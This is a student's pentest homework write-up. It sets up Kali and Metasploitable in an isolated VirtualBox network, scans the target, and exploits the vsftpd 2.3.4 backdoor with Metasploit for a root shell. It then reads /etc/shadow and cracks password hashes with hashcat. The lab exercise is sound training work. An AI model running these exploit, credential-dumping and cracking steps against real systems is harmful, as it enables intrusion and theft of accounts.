# h1 OmaLabra
*Homeworks of first class  
Pentest basics.  
Installing Kali and Metasploitable 2. Little bit about exploiting and stuff.*

Host:  
`I used Debian 11, Lenovo Thinkpad E15`
```bash
~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux 11 (bullseye)
Release:	11
Codename:	bullseye
```
---
**[Tero Karvinen himself, in the course lecture](https://terokarvinen.com/2023/tunkeutumistestaus-2023-kevat/) has been used   as a source for these assignments**   
*Other possible sources are mentioned separately in the sections they are used in.*

### x) Lue ja tiivistä. (Tässä x-alakohdassa ei tarvitse tehdä testejä tietokoneella, vain lukeminen tai kuunteleminen ja tiivistelmä riittää. Tiivistämiseen riittää muutama ranskalainen viiva.)

-   [Darknet Diaries](https://darknetdiaries.com/) tai Herrasmieshakkerit podcast, yksi vapaavalintainen jakso jommasta kummasta. Voi kuunnella myös lenkillä, pyykiä viikatessa tms. Siisti koti / hyvä kunto kaupan päälle.

**I listened:**   
[**EP 6: The Beirut Bank Job**](https://darknetdiaries.com/episode/6/)   
*A penetration tester accidentally robs the wrong bank*

*A true story about **Social Engineering**, my favorite!   
The episode was as awesome as it sounded in the description!*

Jason E. Street.
- A Professional.
	- Security awareness engagements.
		- Testing physical securities of places.

**A successful assignment:**

Jason was hired by a bank to test their physical security in Beirut.   
He walked inside the bank he had assigned to infiltrate, and literally just headed to the offices section, and "fakes" it to make it to look like he is coming from the manager's office. From there he went to the executive's office.   
He handled the executive by telling about auditing the computer systems, and got access to the executive's computer.   
- He used a [Rubber Ducky](https://www.theverge.com/23308394/usb-rubber-ducky-review-hack5-defcon-duckyscript) just to get evidence that he had an opportunity to exploit the computers and network.
		- *Jason: One device is all it takes to compromise the network*
		
Now that he left the room, everyone noticed that he is coming from the executive, so he was good and trustworthy.   
After that he got access to the teller's computers and other devices.   
- From there he could have access to a large deposit of cash if he had wanted to.

He hanged around behind the teller line long time just pretending to do something, while he really could have done almost anything   
- Even the manager asked his help about computer, devices and stuff.
	- As the manager was compromised, he had access to everywhere but the vault.
			
He even got to take stuff out of the bank.   
- How no one suspected anything shady happening:   
	- *Jason:	Because what kind of crazy person walks into a freaking branch and steals a computer?*

**In any point, no one verified him!**   
- Everyone assumed that someone else had done it.

While these were successful tasks, the story continued to another assignment, that went different, as he accidentally broke in to a wrong bank!

I highly recommend the episode to anyone interested about Social Engineering!

### a) Asenna Kali virtuaalikoneeseen

Ive had Kali Linux installed in VirtualBox and directly to hardware, for while, i think 2021.4 originally, and im using the VirtualBox one, for these assignments:
```bash
──(kali㉿kali)-[~]
└─$ grep VERSION /etc/os-release
VERSION="2023.1"
VERSION_ID="2023.1"
VERSION_CODENAME="kali-rolling"
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ uname -a
Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linux
```

As the first assignment is to install Kali, i just wrote a quick guide to get it up and running in VirtualBox:

- Download the [latest Kali- VirtualBox 64 image](https://www.kali.org/get-kali/#kali-virtual-machines) (2023.1 at the time of writing) 
- Extract the package to location of your choice.
- Open VirtualBox:
	- Tools
		- Add
	- Browse to extracted folder and select `kali-linux-<version>-virtualbox-amd64.vbox`
	- Then start it up and login with credentials mentioned in machine "Description"
**Profit!**

**Supercool special bonus:**
[Installing Kali with Vagrant](https://app.vagrantup.com/kalilinux/boxes/rolling)

- What is Vagrant?
- https://www.vagrantup.com/

As im a fan of Vagrant, i did a quick Vagrant script to get disposable Kali installation, with few customizations.   
This is my personal experiment just for fun, and not any official guide, so something can break, something might not work!

This setup has a Vagrantfile, which initializes the machine, and a post-install script to be run as the new user with `sudo` to delete the `vagrant` user, disable ssh and set key-map to `Finnish`.
**Vagrant file**:
```ruby
# -*- mode: ruby -*-
# vi: set ft=ruby :

$kali = <<KALI
apt-get update 
apt-get dist-upgrade -y
sudo useradd -m -p $(openssl passwd -6 hardpasswordhere) -s /bin/bash sicki
usermod -a -G adm,dialout,cdrom,floppy,sudo,audio,dip,video,plugdev,users,netdev,wireshark,bluetooth,scanner,vboxsf,kaboxer sicki
mv /home/vagrant/postinstkali /usr/bin/
chmod 700 /usr/bin/postinstkali
chown root:root /usr/bin/postinstkali
KALI

Vagrant.configure("2") do |config|
	config.vm.define "Kali" do |kali|
		kali.vm.box = "kalilinux/rolling"
    	kali.vm.hostname = "random"
    	kali.vm.network :private_network, ip: "192.168.56.10"
    	kali.vm.provision "shell", inline: $kali
    	kali.vm.provision "file", source: "postinstkali", destination: "/home/vagrant/postinstkali"
		kali.vm.synced_folder '.', '/vagrant', disabled: true
    	kali.vm.provider :virtualbox do |vb|
			vb.name = "Vagrant_Kali"
			vb.memory = 4098
			vb.cpus = 4
			vb.customize ["modifyvm", :id, "--vram", "32"]
			vb.gui = false
		end
	end
end
```
**postinstkali**:
```bash
#!/bin/bash
sudo systemctl stop sshd && sudo systemctl disable sshd
sudo userdel -r vagrant
sudo localectl set-x11-keymap fi
setxkbmap fi
```
Both files in same directory!
```bash
~/Projects/Kali$ tree
.
├── postinstkali
└── Vagrantfile
```

So when the machine gets created, it updates and upgrades the packages, creates a new user `sicki` with password as `hardpasswordhere`.      
Then it adds the created user to several groups, which in this case is a list of groups that the Vagrant assigns the `vagrant` user to.   
It also copies the `postinstkali` script to the new machine's `/usr/bin/` and gives it the proper owner and permissions.   

```bash
~/Projects/Kali$ vagrant up
```

After the machine is successfully created i could login with the created user and password.      
Then run post-install script, remove the script and reboot:
```bash
┌──(sicki㉿random)-[~]
└─$ sudo postinstkali
[sudo] password for sicki: 
Removed "/etc/systemd/system/multi-user.target.wants/ssh.service".
Removed "/etc/systemd/system/sshd.service".
userdel: vagrant mail spool (/var/mail/vagrant) not found

┌──(sicki㉿random)-[~]
└─$ sudo rm /usr/bin/postinstkali 

┌──(sicki㉿random)-[~]
└─$ sudo reboot
```
**Profit!**

Removing the `vagrant` user and disabling `ssh` will break some connections and stuff with Vagrant, but i dont mind!  
```bash
vagrant up
vagrant reload
vagrant destroy
```
will work anyway!

*Of course one can remove the `provisioning` from the Vagrant file and use the `vagrant` user if wanting to!*

### b) Asenna Metasploitable 2 virtuaalikoneeseen

So to install Metasploitable 2 to VirtualBox, i started by downloading the Metasploitable2 package:   
[Sourceforge: Metasploitable2](https://sourceforge.net/projects/metasploitable/)   

After downloading, it extracted it to location of my choice.   
Then i followed this guide:   
https://www.geeksforgeeks.org/how-to-install-metasploitable-2-in-virtualbox/

So i created a new Virtual Machine in VirtualBox.
Specs:
```
Name: Metasploitable2
Type: Linux
Version: other (64-bit)
RAM: 512MB
Use an existing virtual hard disk file: Metasploitable.vmdk
# Hard disk file found in the extracted folder from Metasploit 2 package.
```

After it was created, i didnt boot it up yet, but proceeded to the next assignment.

### c) Tee koneille virtuaaliverkko, jossa:
-   Kali saa yhteyden Internettiin, mutta sen voi laittaa pois päältä.
-   Kalin ja Metasploitablen välillä on host-only network, niin että porttiskannatessa ym. koneet on eristetty intenetistä, mutta ne saavat yhteyden toisiinsa.

I started this assignment as a continuation to previous.   
There is host-only network mentioned, to be created between Kali and Metasploit, so that Kali would still have access to public internet.  
I did this little bit different.  
As i have Kali and Metasploit 2 virtual machines ready now, i created a new virtual DHCP Server for my upcoming new `Internal network` for VirtualBox, from my Host PC commandline.  

*I did the new `Internal network`, as i didnt want to have any more `host-only adapters` assigned to my Host and still wanted a separate network just for pentesting.   
I will be using the same virtual network during the rest of the course, if there is no need to have network connection between the Host and the virtual machines*

Documentations about VirtualBox DHCP Server:   
https://www.virtualbox.org/manual/ch08.html#vboxmanage-dhcpserver   

So the command which is pretty self explained was:
```bash
VBoxManage dhcpserver add --network=pentestNet --server-ip=192.168.66.1 --netmask=255.255.255.0 --lower-ip=192.168.66.2 --upper-ip=192.168.66.254 --enable
```

Now in VirtualBox GUI, i setup the network settings:
- Kali:   
	- Network Adapter 1: NAT = Access to Internet which can simply be disabled with tapping off the `Cable Connected`
	- Network Adapter 2: Internal Network - pentestNet

- Metasploitable2:
	- Network Adapter 1: Internal Network - pentestNet

Now as ive configured the DHCP in previous step, they both get IP address from same network automatically!  

**Profit!**

### d) Etsi Metasploitable porttiskannaamalla (db_nmap -sn). Tarkista selaimella, että löysit oikean IP:n - Metasploitablen etusivulla lukee Metasploitable.

I booted up both virtual machines first.  
Then made sure that they are off the Internet by using:
```bash
ping google.com
ping 1.1.1.1
ping 8.8.8.8
```

Both gave `network unreachable` errors! As should!!   

**Now to the good stuff!**   
Ok, i know that they are in the same network, but i checked the IP in Kali, as it should have one from the range i specified when i created the  DHCP:
```bash
┌──(kali㉿kali)-[~]
└─$ ifconfig -a 
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.66.2  netmask 255.255.255.0  broadcast 192.168.66.255
        inet6 fe80::a00:27ff:fe8a:6bac  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:8a:6b:ac  txqueuelen 1000  (Ethernet)
        RX packets 28  bytes 5512 (5.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 23  bytes 3096 (3.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
All good all good!   
First i created a working directory, form where i started the Metasploit database and Metasploit Framework console with:   
```bash
┌──(kali㉿kali)-[~]
└─$ mkdir firstday

┌──(kali㉿kali)-[~]
└─$ cd firstday 

┌──(kali㉿kali)-[~/firstday]
└─$ sudo msfdb run
# Ascii stuff here, removed to save space

       =[ metasploit v6.3.4-dev                           ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the 
last opened session
Metasploit Documentation: https://docs.metasploit.com/

msf6 > 
```

Set up workspace:
```bash
msf6 > workspace -a firstday
[*] Added workspace: firstday
[*] Workspace: firstday
```

Next a light port scan AKA `ping-sweep` for the whole subnet:   
```bash
msf6 > db_nmap -sn 192.168.66.*
```

Three hosts/devices found up and running.  
Ok to speed things up, i knew .1 is the DHCP Server and .2 is my own. So i went after .4!
```bash
[*] Nmap: Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 04:31 EDT
[*] Nmap: 'mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers'
[*] Nmap: Nmap scan report for 192.168.66.1
[*] Nmap: Host is up (0.00054s latency).
[*] Nmap: MAC Address: 08:00:27:02:93:AE (Oracle VirtualBox virtual NIC)
[*] Nmap: Nmap scan report for 192.168.66.4
[*] Nmap: Host is up (0.00048s latency).
[*] Nmap: MAC Address: 08:00:27:33:20:5C (Oracle VirtualBox virtual NIC)
[*] Nmap: Nmap scan report for 192.168.66.2
[*] Nmap: Host is up.
[*] Nmap: Nmap done: 256 IP addresses (3 hosts up) scanned in 2.31 seconds

```
I proceeded to next assignment.

### e) Porttiskannaa Metasploitable huolellisesti (db_nmap -A)

Continuing straight from previous assignment, i did a deeper scan to found host `192.168.66.4` and saved the output to file `4`
```bash
msf6 > db_nmap -A -p- 192.168.66.4 -oA 4
```
Now as it prints a lot of info, the ftp is what im interested at:
```bash
[*] Nmap: PORT      STATE SERVICE     VERSION
[*] Nmap: 21/tcp    open  ftp         vsftpd 2.3.4
[*] Nmap: | ftp-syst:
[*] Nmap: |   STAT:
[*] Nmap: | FTP server status:
[*] Nmap: |      Connected to 192.168.66.2
[*] Nmap: |      Logged in as ftp
[*] Nmap: |      TYPE: ASCII
[*] Nmap: |      No session bandwidth limit
[*] Nmap: |      Session timeout in seconds is 300
[*] Nmap: |      Control connection is plain text
[*] Nmap: |      Data connections will be plain text
[*] Nmap: |      vsFTPd 2.3.4 - secure, fast, stable
[*] Nmap: |_End of status
[*] Nmap: |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
```
**Anonymous login allowed XD**

Also `services` now has this line:
```bash
host          port   proto  name         state  info
----          ----   -----  ----         -----  ----
192.168.66.4  21     tcp    ftp          open   vsftpd 2.3.4
```

So theres `vsftpd` service running in `port 21` in address `192.168.66.4`

### f) Murtaudu Metasploitablen VsFtpd-palveluun Metasploitilla (search vsftpd, use 0, set RHOSTS - varmista osoite huolella, exploit, id)

Now after finding out the address, port and service, i proceeded to breaking in!   
First checked if theres an exploit in Metasploit for that service mentioned in assignment **e)**

```bash
msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > 

```
Found an exploit!  

Selected it:
```
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```
Checked options:
```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                      sics/using-metasploit.html
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```
The **RPORT** (21) matched the FTP port that was open in target.  

Assigned the **RHOSTS** variable to the address of the target machine:
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > setg RHOSTS 192.168.66.4
RHOSTS => 192.168.66.4
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```

**Now i was ready to roll and attack with `exploit`!**
```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.66.4:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.66.4:21 - USER: 331 Please specify the password.
[+] 192.168.66.4:21 - Backdoor service has been spawned, handling...
[+] 192.168.66.4:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.66.2:44401 -> 192.168.66.4:6200) at 2023-03-27 09:07:28 -0400
```

As it seemed successful, i checked:
```bash
whoami
root
id
uid=0(root) gid=0(root)
```
Rooootz achieved!

I took the password hashes from `/etc/shadow` to go so they could be tried to crack with `hashcat` or `john` later in peace!
```bash
cat /etc/shadow
```

### n) Vapaaehtoinen: Murtaudu johonkin toiseen Metasploitablen palveluun.

For this, as it was an optional task, i did a quick password cracking practice.  
As i had the shadow file with hashes, i cleaned everything and pasted only the hashes to separate `password_hashes` file.
```bash
┌──(kali㉿kali)-[~/firstday]
└─$ cat password_hashes 
$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0
$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0
$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/
$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0
$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//

```

Then checked the IDs with `hashid`
```bash
└─$ hashid password_hashes                      
--File 'password_hashes'--
Analyzing '$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.'
[+] MD5 Crypt 
[+] Cisco-IOS(MD5) 
[+] FreeBSD MD5 
Analyzing '$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0'
[+] MD5 Crypt 
[+] Cisco-IOS(MD5) 
[+] FreeBSD MD5 
Analyzing '$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0'
[+] MD5 Crypt 
[+] Cisco-IOS(MD5) 
[+] FreeBSD MD5 
Analyzing '$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/'
[+] MD5 Crypt 
[+] Cisco-IOS(MD5) 
[+] FreeBSD MD5 
Analyzing '$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/'
[+] MD5 Crypt 
[+] Cisco-IOS(MD5) 
[+] FreeBSD MD5 
Analyzing '$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0'
[+] MD5 Crypt 
[+] Cisco-IOS(MD5) 
[+] FreeBSD MD5 
Analyzing '$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//'
[+] MD5 Crypt 
[+] Cisco-IOS(MD5) 
[+] FreeBSD MD5 
--End of file 'password_hashes'-- 
```

Checked `hashcat --help` for that ID
```bash
┌──(kali㉿kali)-[~/firstday]
└─$ hashcat --help| grep md5crypt
    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)    | Operating System
```

More help about Dictionary attack:
```bash
──(kali㉿kali)-[~/firstday]
└─$ hashcat --help|grep Wordlist
  5 | Original-Word:Finding-Rule:Processed-Word:Wordlist
  6 | Hybrid Wordlist + Mask
  7 | Hybrid Mask + Wordlist
  Wordlist         | $P$   | hashcat -a 0 -m 400 example400.hash example.dict
  Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
```

Then did `hashcat` dictionary attack with some word list found from metasploit just for testing purposes:
```bash
┌──(kali㉿kali)-[~/firstday]
└─$ hashcat -a 0 -m 500 password_hashes /usr/share/metasploit-framework/data/wordlists/password.lst
```

Found 4/7 in few seconds!
```bash

└─$ hashcat -a 0 -m 500 password_hashes /usr/share/metasploit-framework/data/wordlists/password.lst --show
$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:batman
$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:123456789
$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:user
$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:service
```

**Then i could just connect the usernames from shadow file to those cracked hashes!**

*Il be doing more attacks later, but dont know if i have time to report everything.*

### m) Vapaaehtoinen, vaikea: Asenna ja korkkaa Metasploitable 3. Karvinen 2018: [Install Metasploitable 3 – Vulnerable Target Computer](https://terokarvinen.com/2018/install-metasploitable-3-vulnerable-target-computer/)

This i started pretty straight forward with the help of article above from Tero and [Github: Rapid7](https://github.com/rapid7/metasploit-framework)

But as usual, i tinkered the Vagrantfile a little bit to suit my needs:
```ruby
# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure("2") do |config|
  config.vm.synced_folder '.', '/vagrant', disabled: true

  config.vm.define "ub1404" do |ub1404|
    ub1404.vm.box = "rapid7/metasploitable3-ub1404"
    ub1404.vm.hostname = "metasploitable3-ub1404"
	config.ssh.password = "vagrant"
	config.ssh.password = "vagrant"
	ub1404.ssh.insert_key = false
	# Note: Assigned to previously created internal network!
    ub1404.vm.network "private_network", ip: '192.168.66.3',
    virtualbox__intnet: "pentestNet"

    ub1404.vm.provider "virtualbox" do |v|
      v.name = "Metasploitable3"
      v.memory = 1024
    end
  end
end
```

At the time of writing, ive had booted it up and plugged the Vagrants automatically generated `NAT` for Network Adapter 2, and tried some exploits just for testing, but havent got any results to report...   

*TODO: Id go for the CUPS, as thats a service im quite familiar with, and know that it has(had) its weaknesses...*